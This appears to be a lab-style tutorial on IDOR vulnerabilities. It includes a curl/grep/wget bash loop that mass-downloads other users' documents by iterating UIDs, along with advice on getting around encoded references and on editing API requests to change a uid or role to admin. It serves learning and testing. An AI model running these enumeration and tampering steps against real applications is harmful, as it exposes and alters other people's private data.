Insecure Direct Object References (IDOR) vulnerabilities are among the most common web vulnerabilities and can significantly impact the vulnerable web application. 
For example, if users request access to a file they recently uploaded, they may get a link to it such as (**download.php?file_id=123**). 
So, as the link directly references the file with (file_id=123), what would happen if we tried to access another file (which may not belong to us) with (**download.php?file_id=124**)?
The main takeaway is that an IDOR vulnerability mainly exists due to the lack of an access control on the back-end. 
If a user had direct references to objects in a web application that lacks access control, it would be possible for attackers to view or modify other users' data.


## IDOR Mass Enumeration(Example)
If your application addressees different user with something similar to: `/documents.php?uid=1`
And every UID have consequent Documents:
```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

We may tamper that by looking for  `/documents.php?uid=2`
And every UID have consequent Documents:
```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```
We can automate this with something similar:
1)We scout for other users and find the HTML tag to be filtered ex:
```
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>

<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
2)We filter it: 
```
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

```
3)Grep the Filename: 
```
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```
4)Script it:
```
#!/bin/bash
url="http://SERVER_IP:PORT"
for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```


## Bypassing Encoded References
Sometimes website will use several encoding in order to make you life a bit harder ex, encode name in md5, or **base64+ur**l encode of the **UID** etc.
To bypass you have to understand how back-end index the files ex can be **BASE64+URLencoding**
Then you can use the help of intruded with **BASE64+Url** Processing of the payload until you find your exploit working.


## Bypass Insecure API Calls
Some functions may call some API ex, in a Profile page we can add some information on our profile, doing so it calls some API:
```
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```
Here we could try to play around with the request and edit our UID, role to admin or even use GET to read other users information.